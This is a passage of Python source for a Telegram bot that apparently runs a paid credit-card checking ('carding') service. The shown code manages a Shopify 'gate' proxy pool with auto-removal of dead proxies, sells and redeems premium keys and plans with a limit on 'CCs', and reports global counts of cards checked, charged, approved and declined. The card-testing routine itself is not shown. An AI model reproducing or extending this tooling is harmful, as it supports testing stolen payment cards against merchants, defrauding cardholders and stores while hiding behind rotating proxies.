    text += f"\n⭐ {bs('Used only for')} {bs(gate_label)} {bs('checks.')}"
    eid.append(5852670420074893746)
    kb = [[pbtn(bs("Check Proxy"), data=f"checkpxygate:{gate}:{uid}", color="blue", icon=5435934308894258303)]]
    if edit_msg:
        await styled_edit(edit_msg, text, buttons=kb, emoji_ids=eid)
    else:
        await styled_reply(event, text, buttons=kb, emoji_ids=eid)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    if event.is_group:
        return await styled_reply(event, f"⭐ {bs('Private only')}", emoji_ids=[5042112436648281096])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)

    await _send_proxy_list(event, "shopify")


@client.on(events.CallbackQuery(pattern=rb"listpxygate:(shopify):(\d+)"))
async def list_proxy_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid or not is_owner(uid):
        return await safe_callback_answer(event, f"{bs('Not yours')}!", alert=True)
    await safe_callback_answer(event)
    await _send_proxy_list(event, gate, edit_msg=await event.get_message())


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    if event.is_group:
        return await styled_reply(event, f"⭐ {bs('Private only')}", emoji_ids=[5042112436648281096])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)

    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1:
        return await styled_reply(event, f"""⭐ <code>/rmpxy index</code>
⭐ <code>/rmpxy all</code>""", emoji_ids=[4902715076873553054, 5042112436648281096])

    arg = p[1].strip().lower()
    uid = event.sender_id
    if arg == 'all':
        PENDING_RM_PROXIES[uid] = {"mode": "all", "index": None, "event": event}
    else:
        try:
            idx = int(arg) - 1
            if idx < 0:
                raise ValueError("bad index")
        except Exception:
            return await styled_reply(event, f"⭐ {bs('Invalid index')}", emoji_ids=[5042112436648281096])
        PENDING_RM_PROXIES[uid] = {"mode": "index", "index": idx, "event": event}

    kb = [
        [pbtn(bs("Shopify"), f"rmpxygate:shopify:{uid}", color="blue")],
    ]
    action = bs("Remove ALL proxies") if arg == "all" else f"{bs('Remove index')} #{int(arg)}"
    await styled_reply(event, f"""⭐  {bs('Confirm')}
━━━━━━━━━━━━━━━━━
⭐ {bs('Action')} → {action}
━━━━━━━━━━━━━━━━━
⭐ {bs('Shopify')} → {bs('Shopify proxy pool')}""", buttons=kb, emoji_ids=[
        5855207143724027916,
        4902715076873553054,
        4902715076873553054,
    ])


@client.on(events.CallbackQuery(pattern=rb"rmpxygate:(shopify):(\d+)"))
async def rm_proxy_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid or not is_owner(uid):
        return await safe_callback_answer(event, f"{bs('Not yours')}!", alert=True)
    data = PENDING_RM_PROXIES.pop(uid, None)
    if not data:
        return await safe_callback_answer(event, f"{bs('Expired')}!", alert=True)
    await safe_callback_answer(event, f"{bs('Done')}")
    try:
        await event.delete()
    except Exception:
        pass

    src = data.get("event") or event
    gate_label = _proxy_gate_label(gate)
    proxies = await get_all_user_proxies(uid, gate=gate)
    if not proxies:
        return await styled_reply(src, f"⭐ {bs('No Proxy Set!')} ({bs(gate_label)})", emoji_ids=NO_PROXY_UI_EMOJIS)

    if data.get("mode") == "all":
        c = await clear_all_proxies(uid, gate=gate)
        log_user(uid, "RM_PROXY_ALL", f"Gate={gate_label} | Cleared={c}")
        return await styled_reply(src, f"⭐ {bs('All')} {bs(str(c))} {bs(gate_label)} {bs('proxies removed')}", emoji_ids=[5278622189556354905])

    idx = data.get("index")
    if idx is None or not (0 <= idx < len(proxies)):
        return await styled_reply(src, f"⭐ {bs('Invalid')} ({bs('1')}-{bs(str(len(proxies)))}) ({bs(gate_label)})", emoji_ids=[5042112436648281096])
    rm = await remove_proxy_by_index(uid, idx, gate=gate)
    if not rm:
        return await styled_reply(src, f"⭐ {bs('Invalid index')} ({bs(gate_label)})", emoji_ids=[5042112436648281096])
    log_user(uid, "RM_PROXY", f"Gate={gate_label} | Removed={rm['ip']}:{rm['port']}")
    await styled_reply(src, f"⭐ {bs('Removed ━')} <code>{rm['ip']}:{rm['port']}</code> ({bs(gate_label)})", emoji_ids=[5278622189556354905])


async def run_check_proxies(event, tm=None, gate: str = "shopify"):
    uid = event.sender_id
    gate_label = _proxy_gate_label(gate)
    proxies = await get_all_user_proxies(uid, gate=gate)
    if not proxies:
        msg = f"""⭐ {bs('No Proxy Set!')} ({bs(gate_label)})

⭐ {bs('Use')} <code>/addpxy</code> → {bs(gate_label)}"""
        if tm:
            return await styled_edit(tm, msg, emoji_ids=NO_PROXY_UI_EMOJIS)
        return await styled_reply(event, msg, emoji_ids=NO_PROXY_UI_EMOJIS)

    log_user(uid, "CHK_PROXY_START", f"Gate={gate_label} | Testing {len(proxies)} proxies")
    start_text = f"""⭐ {bs('Checking Proxies...')} ({bs(gate_label)})

⭐ {bs(f'Total: {len(proxies)}')}
⭐ {bs('Testing in batches of 10...')}"""
    start_emojis = [5325834523068342417, 5215327832040811010, 5084974483685507801]
    if tm:
        await styled_edit(tm, start_text, emoji_ids=start_emojis)
    else:
        tm = await styled_reply(event, start_text, emoji_ids=start_emojis)

    w, d = 0, 0
    tested = 0
    for i in range(0, len(proxies), 10):
        batch = proxies[i:i + 10]
        results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
        for proxy, res in zip(batch, results):
            tested += 1
            proxy_url = proxy.get('proxy_url', '?')
            if isinstance(res, tuple) and res[0]:
                w += 1
                log_user(uid, "CHK_PROXY_OK", f"Gate={gate_label} | Proxy={proxy_url} | IP={res[1]} | [{tested}/{len(proxies)}]")
            else:
                d += 1
                err_detail = res[1] if isinstance(res, tuple) else str(res)[:80]
                log_user(uid, "CHK_PROXY_DEAD", f"Gate={gate_label} | Proxy={proxy_url} | Error={err_detail} | [{tested}/{len(proxies)}]", "warning")
                try:
                    await remove_proxy_by_url(uid, proxy['proxy_url'], gate=gate)
                except Exception:
                    pass

        await styled_edit(tm, f"""⭐ {bs('Testing proxies...')} ({bs(gate_label)})

⭐ {bs(f'Working: {w}/{len(proxies)}')}
⭐ {bs(f'Dead: {d}')}
⭐ {bs(f'Tested: {tested}/{len(proxies)}')}""", emoji_ids=[
            5325834523068342417,
            5278622189556354905,
            5042112436648281096,
            5215327832040811010,
        ])

    log_user(uid, "CHK_PROXY_DONE", f"Gate={gate_label} | Working={w} | Dead={d} | Total={len(proxies)}")

    if w > 0:
        remaining_proxies = await get_all_user_proxies(uid, gate=gate)
        text = f"""⭐ {bs('Proxy Check Complete!')} ({bs(gate_label)})

⭐ {bs(f'Working: {w}')}
⭐ {bs(f'Dead: {d}')}
⭐ {bs(f'Total saved: {w}/{len(proxies)}')}

"""
        eid = [5278622189556354905, 5084974483685507801, 5042112436648281096, 5980995951160987855]
        for i, p in enumerate(remaining_proxies[:10], 1):
            ip = str(p.get("ip") or "")
            port = str(p.get("port") or "")
            ptype = str(p.get("proxy_type") or "http").upper()
            text += f"⭐ {bs(f'{i}. {ip}:{port} ({ptype})')}\n"
            eid.append(5084974483685507801)
        if len(remaining_proxies) > 10:
            text += f"⭐ {bs(f'... {len(remaining_proxies) - 10} more')}\n"
            eid.append(4902715076873553054)
        text += f"\n⭐ {bs('Used only for')} {bs(gate_label)} {bs('checks.')}"
        eid.append(5852670420074893746)
        kb = [[pbtn(bs("Check Proxy"), data=f"checkpxygate:{gate}:{uid}", color="blue", icon=5435934308894258303)]]
        await styled_edit(tm, text, buttons=kb, emoji_ids=eid)
    else:
        await styled_edit(tm, f"""⭐ {bs('All proxies are dead!')} ({bs(gate_label)})

⭐ {bs(f'Tested: {len(proxies)}')} | {bs('None working.')}""", emoji_ids=[
            5042112436648281096,
            5855207143724027916,
        ])


@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    if event.is_group:
        return await styled_reply(event, f"⭐ {bs('Private only')}", emoji_ids=[5042112436648281096])
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)

    msg = await run_check_proxies(event, gate="shopify")


@client.on(events.CallbackQuery(pattern=rb"checkpxygate:(shopify):(\d+)"))
async def check_proxy_gate_cb(event):
    gate = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid or not is_owner(uid):
        return await safe_callback_answer(event, f"{bs('Not yours')}!", alert=True)
    if await is_banned_user(uid):
        return await safe_callback_answer(event, "You are banned.", alert=True)
    await safe_callback_answer(event, f"{bs('Checking')} {_proxy_gate_label(gate)}...")
    msg = await event.get_message()
    await run_check_proxies(event, tm=msg, gate=gate)


@client.on(events.CallbackQuery(data=b"check_proxies_cb"))
async def check_proxies_callback(event):
    # Legacy button → check Shopify proxies directly
    if not is_owner(event.sender_id):
        return await safe_callback_answer(event, f"{bs('Owner only command!')}", alert=True)
    await safe_callback_answer(event)
    msg = await event.get_message()
    await run_check_proxies(event, tm=msg, gate="shopify")

# ====================== KEYS SYSTEM ======================
KEYS_USAGE_TEXT = f"""{PE} {bs('Usage:')}

{PE} <code>/keys [amount] [day or days]</code>


{PE} {bs('Or reply to a user by')} <code>/key [amount] [day or days]</code>

{PE} {bs('Supported formats:')}
{PE} <code>/key [amount] [day]</code>
{PE} <code>/keys [amount] [days]</code>


{PE} {bs('Max 1 key per user until plan expires.')}"""

KEYS_USAGE_EMOJIS = [
    5855207143724027916,
    4902715076873553054,
    4902715076873553054,
    5084974483685507801,
    4902715076873553054,
    4902715076873553054,
    5980995951160987855,
]


def _parse_key_args(raw_text: str):
    parts = (raw_text or "").split()
    if len(parts) < 3:
        return None, None
    try:
        amount = int(parts[1])
        days = int(parts[2])
    except (TypeError, ValueError):
        return None, None
    if amount < 1 or days < 1:
        return None, None
    return amount, days


def _format_keys_list_ui(title: str, keys: list, days: int | None = None):
    count = len(keys)
    plan_days = days
    if plan_days is None and keys:
        plan_days = 1
    plan_days = plan_days or 1
    day_label = "day" if plan_days == 1 else "days"
    lines = [
        f"{bs(title)} {PE}",
        "━━━━━━━━━━━━━━━━━━━━",
        "",
        f"┣ {PE} {bs('Count')} ➜ {bs(str(count))}",
        f"┣ {PE} {bs('Plan')} ➜ {bs(f'{plan_days} {day_label} Plan')}",
        f"┣ {PE} {bs('Keys')}",
    ]
    emoji_ids = [
        5226656353744862682,
        5084974483685507801,
        5980995951160987855,
        5278622189556354905,
    ]
    for i, key in enumerate(keys):
        prefix = "┗" if i == len(keys) - 1 else "┣"
        lines.append(f"{prefix} <code>{html.escape(key)}</code>")
    lines.append("")
    lines.append(f"{PE} {bs('Users redeem with')} <code>/redeem [key]</code> {PE}")
    emoji_ids.extend([5172739056592749710, 5084974483685507801])
    return "\n".join(lines), emoji_ids


def _redeem_success_text(days: int) -> str:
    day_label = "day" if days == 1 else "days"
    bot_user = BOT_LINK.rstrip("/").split("/")[-1]
    return f"""{bs('Key Redeemed Successfully!')} {PE}

{PE} {bs('Thanks for your purchase!')}
{PE} {bs('Plan:')} {bs(f'{days} {day_label}')}

{PE} {bs('You now have access to:')}
{PE} <a href="https://t.me/{bot_user}?start=msp">/msp</a> — {bs('Mass Shopify')}

{PE} {bs('Enjoy your premium experience!')}"""


REDEEM_SUCCESS_EMOJIS = [
    5226656353744862682,
    5278622189556354905,
    5084974483685507801,
    5195033767969839232,
    4902715076873553054,
    5172739056592749710,
]


async def _generate_keys_flow(event, amount: int, days: int, assigned_to: int | None = None):
    if amount > MAX_KEYS_PER_GENERATE:
        amount = MAX_KEYS_PER_GENERATE
    keys = await create_keys(amount, days, created_by=event.sender_id, assigned_to=assigned_to)
    if not keys:
        return await styled_reply(event, f"{PE} {bs('Failed to generate keys')}", emoji_ids=[5042112436648281096])
    title = "Keys Generated"
    text, eids = _format_keys_list_ui(title, keys, days=days)
    log_user(
        event.sender_id,
        "KEYS_GENERATE",
        f"Count={len(keys)} | Days={days} | Assigned={assigned_to}",
    )
    await styled_reply(event, text, emoji_ids=eids)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]keys\b'))
async def keys_cmd(event):
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    amount, days = _parse_key_args(event.raw_text)
    if amount is None:
        return await styled_reply(event, KEYS_USAGE_TEXT, emoji_ids=KEYS_USAGE_EMOJIS)
    await _generate_keys_flow(event, amount, days, assigned_to=None)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]key\b'))
async def key_cmd(event):
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    amount, days = _parse_key_args(event.raw_text)
    if amount is None:
        return await styled_reply(event, KEYS_USAGE_TEXT, emoji_ids=KEYS_USAGE_EMOJIS)
    assigned_to = None
    if event.is_reply:
        try:
            rm = await event.get_reply_message()
            if rm and rm.sender_id:
                assigned_to = int(rm.sender_id)
        except Exception:
            assigned_to = None
    # /key is for assigning to a replied user; without reply behave like single/open key gen
    await _generate_keys_flow(event, amount, days, assigned_to=assigned_to)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rem$'))
async def rem_keys_cmd(event):
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    await expire_stale_unused_keys()
    remaining = await get_remaining_keys(limit=500)
    if not remaining:
        return await styled_reply(
            event,
            f"{PE} {bs('No remaining keys')}\n{PE} {bs('Generate with')} <code>/keys [amount] [days]</code>",
            emoji_ids=[5042112436648281096, 4902715076873553054],
        )
    # Group remaining keys by plan days and show each batch
    grouped = {}
    for k in remaining:
        d = int(k.get("days") or 1)
        grouped.setdefault(d, []).append(k.get("key"))
    for days_val in sorted(grouped.keys()):
        codes = [c for c in grouped[days_val] if c]
        if not codes:
            continue
        text, eids = _format_keys_list_ui("Remaining Keys", codes, days=days_val)
        await styled_reply(event, text, emoji_ids=eids)


@client.on(events.NewMessage(pattern=r'(?i)^[/.]redeem\b'))
async def redeem_cmd(event):
    if not await force_join_check(event):
        return
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)
    await ensure_user(event.sender_id)
    parts = event.raw_text.split(maxsplit=1)
    if len(parts) < 2 or not parts[1].strip():
        return await styled_reply(
            event,
            f"{PE} {bs('Usage:')}\n{PE} <code>/redeem [key]</code>",
            emoji_ids=[5855207143724027916, 4902715076873553054],
        )
    key_code = parts[1].strip().split()[0]
    result = await redeem_key(key_code, event.sender_id)
    err = result.get("error")
    if err == "already_redeemed":
        return await styled_reply(
            event,
            f"{PE} {bs('Redemption Failed!')}\n\n{PE} {bs('Key already redeemed')}",
            emoji_ids=[5042112436648281096, 5855207143724027916],
        )
    if err == "expired":
        return await styled_reply(
            event,
            f"{PE} {bs('Redemption Failed!')}\n\n{PE} {bs('Key expired. Contact')} {OWNER_CONTACT}.",
            emoji_ids=[5042112436648281096, 5855207143724027916],
        )
    if err == "not_yours":
        return await styled_reply(
            event,
            f"{PE} {bs('Not Your Key!')}\n\n"
            f"{PE} {bs('Contact the owner')} {OWNER_CONTACT} {bs('to get a key before checking.')}",
            emoji_ids=[5042112436648281096, 4902715076873553054],
        )
    if err == "already_premium":
        expiry = await get_user_expiry(event.sender_id)
        left = format_premium_time_left(expiry)
        return await styled_reply(
            event,
            f"{PE} {bs('You already have premium!')}\n\n"
            f"{PE} {bs('Plan:')} {bs(left)}\n"
            f"{PE} {bs('You cannot redeem another key while premium is active.')}",
            emoji_ids=[5042112436648281096, 5084974483685507801, 5855207143724027916],
        )
    if err or not result.get("ok"):
        return await styled_reply(
            event,
            f"{PE} {bs('Redemption Failed!')}\n\n{PE} {bs('Invalid key')}",
            emoji_ids=[5042112436648281096, 5855207143724027916],
        )

    days = int(result.get("days") or 1)
    success_text = _redeem_success_text(days)
    log_user(event.sender_id, "KEY_REDEEM", f"Key={key_code} | Days={days}")
    # Always show in the chat where redeem was used
    await styled_reply(event, success_text, emoji_ids=REDEEM_SUCCESS_EMOJIS)
    # Also DM the user when redeem was used outside private chat
    if event.chat_id != event.sender_id:
        try:
            await styled_send(event.sender_id, success_text, emoji_ids=REDEEM_SUCCESS_EMOJIS)
        except Exception:
            pass
    # Same channel used for plan purchase logs
    try:
        name, username, tag, prof = await get_user_info(event.sender_id)
        channel_text = (
            f"{success_text}\n\n"
            f"{PE} {bs('User')} ➛ {user_link_html(event.sender_id, name)}"
        )
        await styled_send(LOG_CHANNEL_ID, channel_text, emoji_ids=REDEEM_SUCCESS_EMOJIS + [5084974483685507801])
    except Exception as e:
        log_system("KEY_REDEEM_CHANNEL_ERR", str(e), "error")


# ====================== PLAN ======================
async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try:
        target_uid = int(parts[1])
    except ValueError:
        return await styled_reply(event, f"{PE} {bs('Invalid user ID')}", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try:
        target_entity = await client_instance.get_entity(target_uid)
        target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except:
        target_name = "Unknown"
    await ensure_user(target_uid)
    current_plan = await get_user_plan(target_uid)
    is_upgrade = is_paid_plan(current_plan)
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    log_user(target_uid, "PLAN_SET", f"Plan={pi['tier']} | Duration={pi['duration_days']}d | By={event.sender_id} | Previous={current_plan} | Expiry={expiry_date}")
    await styled_reply(event, f"""✓ {bs('Plan Updated')}

<a href='https://t.me/ravenu899'>⊀</a> {bs('User')} ↬ {user_link_html(target_uid, target_name)}
<a href='https://t.me/ravenu899'>⊀</a> {bs('Plan')} ↬ {pi['emoji']} {pi['name']}
<a href='https://t.me/ravenu899'>⊀</a> {bs('Tier')} ↬ <code>{pi['tier']}</code>
<a href='https://t.me/ravenu899'>⊀</a> {bs('Duration')} ↬ <code>{pi['duration_days']} {bs('days')}</code>
<a href='https://t.me/ravenu899'>⊀</a> {bs('Expires')} ↬ <code>{expiry_date}</code>
<a href='https://t.me/ravenu899'>⌬</a> {bs('Dev')} ↬ <a href='https://t.me/ravenu899'>{bs('Raven')}</a>""")
    try:
        await styled_send(target_uid, f"""🎉 {bs('Congratulations!')} 🎉

<a href='https://t.me/ravenu899'>⊀</a> {bs('Your Plan Has Been Upgraded')}
<a href='https://t.me/ravenu899'>⊀</a> {bs('Plan')} ↬ {pi['emoji']} {pi['name']}
<a href='https://t.me/ravenu899'>⊀</a> {bs('Tier')} ↬ <code>{pi['tier']}</code>
<a href='https://t.me/ravenu899'>⊀</a> {bs('Duration')} ↬ <code>{pi['duration_days']} {bs('days')}</code>
<a href='https://t.me/ravenu899'>⊀</a> {bs('Expires')} ↬ <code>{expiry_date}</code>

<a href='https://t.me/ravenu899'>ℭ</a> {bs('Benefits')} ━ {bs('Mass check unlocked')}
<a href='https://t.me/ravenu899'>ℭ</a> {bs('Limit')} ━ {bs(str(get_cc_limit(pi['tier'])))} {bs('CCs')}

<a href='https://t.me/ravenu899'>⌬</a> {bs('Thank you for choosing our service!')}
<a href='https://t.me/ravenu899'>⌬</a> {bs('Dev')} ↬ <a href='https://t.me/ravenu899'>{bs('Raven')}</a>""")
    except:
        pass
    try:
        random_suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        masked = f"{random_suffix[:2]}XXXX{random_suffix[-2:]}"
        receipt_id = f"RAZORX-{masked}"
        log_title = f"{bs('Plan RENEWED')} 🔄" if is_upgrade else f"{bs('New Plan Purchase')} 🛒"
        log_msg = f"""{log_title}
<a href='https://t.me/ravenu899'>⊀</a> {bs('User')} ↬ {user_link_html(target_uid, target_name)}
<a href='https://t.me/ravenu899'>⊀</a> {bs('Plan')} ↬ {pi['emoji']}{pi['name']}
<a href='https://t.me/ravenu899'>ℭ</a> {bs('Price')} ↬ <code>{pi['price']}</code>
<a href='https://t.me/ravenu899'>ℭ</a> {bs('Receipt')} ↬ <code>{receipt_id}</code>
<a href='https://t.me/ravenu899'>⌬</a> {bs('Dev')} ↬ <a href='https://t.me/ravenu899'>{bs('Raven')}</a>"""
        await styled_send(LOG_CHANNEL_ID, log_msg)
    except:
        pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event):
    await _handle_plan_assign(event, "plan1")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event):
    await _handle_plan_assign(event, "plan2")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event):
    await _handle_plan_assign(event, "plan3")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event):
    await _handle_plan_assign(event, "plan4")


@client.on(events.NewMessage(pattern=r'(?i)^[/.]addcr\b'))
async def addcr_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 3:
        return await styled_reply(event, f"{PE} <code>/addcr user_id amount</code>", emoji_ids=[CE["warn"]])
    try:
        target_uid = int(parts[1])
        amount = int(parts[2])
    except ValueError:
        return await styled_reply(event, f"{PE} {bs('Invalid user ID or amount')}", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    await add_user_credits(target_uid, amount)
    new_balance = await get_user_credits(target_uid)
    try:
        target_entity = await client_instance.get_entity(target_uid)
        target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except Exception:
        target_name = "Unknown"
    log_user(target_uid, "CREDITS_ADD", f"Amount=+{amount} | NewBalance={new_balance} | By={event.sender_id}")
    cr_msg = f"""{bs('Credits Added!')} {PE}
 {bs('User')} \u21ac {user_link_html(target_uid, target_name)}
 {bs('Credits Added')} \u21ac +{amount}
 {bs('Total Credits')} \u21ac {new_balance}"""
    cr_kb = [[pbtn(bs("Support"), url="https://t.me/ravenu899", color="green")]]
    cr_ei = [CE["addtick"]]
    await styled_reply(event, cr_msg, buttons=cr_kb, emoji_ids=cr_ei)
    try:
        await styled_send(target_uid, cr_msg, buttons=cr_kb, emoji_ids=cr_ei)
    except Exception:
        pass



@client.on(events.NewMessage(pattern=r'(?i)^[/.]rkey\b'))
async def rkey_cmd(event):
    if not await force_join_check(event):
        return
    if not is_owner(event.sender_id):
        return await send_owner_only_message(event)
    if await is_banned_user(event.sender_id):
        t, e = banned_user_message()
        return await styled_reply(event, t, emoji_ids=e)

    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(
            event,
            f"{PE} {bs('Usage')}\n<code>/rkey [user_id]</code>",
            emoji_ids=[5855207143724027916],
        )
    try:
        target_uid = int(parts[1])
    except ValueError:
        return await styled_reply(
            event,
            f"{PE} {bs('Usage')}\n<code>/rkey [user_id]</code>",
            emoji_ids=[5855207143724027916],
        )

    await ensure_user(target_uid)
    current_plan = await get_user_plan(target_uid)
    if not is_paid_plan(current_plan):
        return await styled_reply(
            event,
            f"{PE} {bs('User has no active plan')}",
            emoji_ids=[5042112436648281096],
        )

    await set_user_plan(target_uid, FREE_PLAN, 0)
    log_user(target_uid, "RKEY_REVOKE", f"Revoked={current_plan} | By={event.sender_id}")

    dm_text = (
        f"{bs('Your Plan is Expired.')} {PE}\n\n"
        f"{bs('Contact the owner')} {OWNER_CONTACT}."
    )
    dm_ok = False
    try:
        await styled_send(target_uid, dm_text, emoji_ids=[5319007286004299794])
        dm_ok = True
    except Exception as e:
        log_user(target_uid, "RKEY_DM_ERR", f"Error={e}", "error")

    await styled_reply(
        event,
        f"{PE} {bs('Plan Revoked')}\n"
        f"{PE} {bs('User')} ━ <code>{target_uid}</code>\n"
        f"{PE} {bs('Previous')} ━ {bs(current_plan)}\n"
        f"{PE} {bs('DM')} ━ {bs('Sent' if dm_ok else 'Failed')}",
        emoji_ids=[
            5278622189556354905,
            5084974483685507801,
            5980995951160987855,
            4902715076873553054,
        ],
    )


@client.on(events.NewMessage(pattern=r'(?i)^[/.]rplan\b'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    parts = event.raw_text.split()
    if len(parts) < 2:
        return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try:
        target_uid = int(parts[1])
    except ValueError:
        return await styled_reply(event, f"{PE} {bs('Invalid user ID')}", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    current_plan = await get_user_plan(target_uid)
    if not is_paid_plan(current_plan):
        return await styled_reply(event, f"{PE} {bs('User has no active plan')}", emoji_ids=[CE["cross"]])
    try:
        target_entity = await client_instance.get_entity(target_uid)
        target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except:
        target_name = "Unknown"
    plan_name = current_plan.upper()
    plan_emoji = "❔"
    for pi in PLANS.values():
        if pi["tier"].lower() == current_plan.lower():
            plan_name = pi["name"]
            plan_emoji = pi["emoji"]
            break
    await set_user_plan(target_uid, FREE_PLAN, 0)
    log_user(target_uid, "PLAN_REVOKE", f"Revoked={current_plan} | By={event.sender_id}")
    await styled_reply(event, f"""✓ {bs('Plan Revoked')}

<a href='https://t.me/ravenu899'>⊀</a> {bs('User')} ↬ {user_link_html(target_uid, target_name)}
<a href='https://t.me/ravenu899'>⊀</a> {bs('Previous Plan')} ↬ {plan_emoji} {plan_name} ({bs(current_plan)})
<a href='https://t.me/ravenu899'>⊀</a> {bs('New Plan')} ↬ <code>{bs(FREE_PLAN)}</code>
<a href='https://t.me/ravenu899'>⌬</a> {bs('Dev')} ↬ <a href='https://t.me/ravenu899'>{bs('Raven')}</a>""")
    try:
        await styled_send(target_uid, f"""ℹ️ {bs('Plan Status Update')}

<a href='https://t.me/ravenu899'>⊀</a> {bs('Hello')} {bs(target_name)},
<a href='https://t.me/ravenu899'>⊀</a> {bs('Your')} {plan_name} ({bs(current_plan)}) {bs('has been ended.')}

<a href='https://t.me/ravenu899'>ℭ</a> {bs('Current Status')} ━ {bs(f'Reverted to {FREE_PLAN}')}

<a href='https://t.me/ravenu899'>⌬</a> {bs('To renew, contact')} <a href='https://t.me/ravenu899'>@ravenu899</a>
<a href='https://t.me/ravenu899'>⌬</a> {bs('Dev')} ↬ <a href='https://t.me/ravenu899'>{bs('Raven')}</a>""")
    except:
        pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]planall$'))
async def planall_cmd(event):
    if event.sender_id not in ADMIN_ID:
        return
    await expire_due_plans()
    all_users = await get_active_premium_users()
    if not all_users:
        return await styled_reply(event, f"{PE} {bs('No active plans')}", emoji_ids=[CE["warn"]])
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    fn = f"active_plans_{ts}.txt"
    content = f"ACTIVE PLANS LIST\nGenerated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\nTotal: {len(all_users)}\n{'=' * 40}\n\n"
    for u in all_users:
        uid2 = u.get("user_id", "?")
        tier = u.get("plan", "?")
        expiry = u.get("expiry")
        exp_str = expiry.strftime('%Y-%m-%d %H:%M:%S') if expiry else "Never"
        emoji = "❔"
        pname = tier
        for pi in PLANS.values():
            if pi["tier"] == tier:
                emoji = pi["emoji"]
                pname = pi["name"]
                break
        try:
            ent = await client_instance.get_entity(uid2)
            uname = getattr(ent, 'first_name', None) or "Unknown"
        except:
            uname = "Unknown"
        content += f"User: {uname}\nID: {uid2}\nPlan: {emoji} {pname}\nTier: {tier}\nExpires: {exp_str}\n{'-' * 40}\n"
    async with aiofiles.open(fn, 'w', encoding='utf-8') as f:
        await f.write(content)
    try:
        await styled_send(event.chat_id, f"{bs('Active Plans')} ({bs(str(len(all_users)))}) {PE}", emoji_ids=[CE["fire"]], file=fn)
    except:
        pass
    try:
        os.remove(fn)
    except:
        pass


@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if not await force_join_check(event):
        return
    try:
        tc = await get_total_cards_count()
        ch = await get_charged_count()
        ap = await get_approved_count()
        dc = await get_declined_count()
        log_system("STATS", f"Checked={tc} | Charged={ch} | Approved={ap} | Declined={dc}")
        text = f"""{bs('Global Analytics')} {PE}
━━━━━━━━━━━━━━━━━━━━━
{PE} {bs('Total Checked')} ➛ <code>{tc:,}</code>
{PE} {bs('Total Charged')} ➛ <code>{ch:,}</code>
{PE} {bs('Total Approved')} ➛ <code>{ap:,}</code>
{PE} {bs('Total Declined')} ➛ <code>{dc:,}</code>
━━━━━━━━━━━━━━━━━━━━━
🛠️ {bs('Dev')} ➛ <a href='{DEV_LINK}'>{bs('Raven')}</a>"""
        charged_emoji = random.choice(CHARGED_EMOJIS)
        await styled_reply(event, text, emoji_ids=[5042290883949495533, 5257969839313526622, charged_emoji, 4958610528588008305, 4956612582816351459])
    except Exception as e:
        await styled_reply(event, f"{PE} {bs('Error')} ━ <code>{e}</code>", emoji_ids=[CE["cross"]])


# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    try:
        seeded = 0
        for admin_id in ADMIN_ID:
            seeded = await seed_global_sites_from_user(admin_id)
            if seeded:
                break
        await count_global_sites()
    except Exception as e:
        log_system("BOOT", f"Shopify pool seed warning: {e}", "warning")
    await expire_due_plans()
    asyncio.create_task(_plan_expiry_worker())

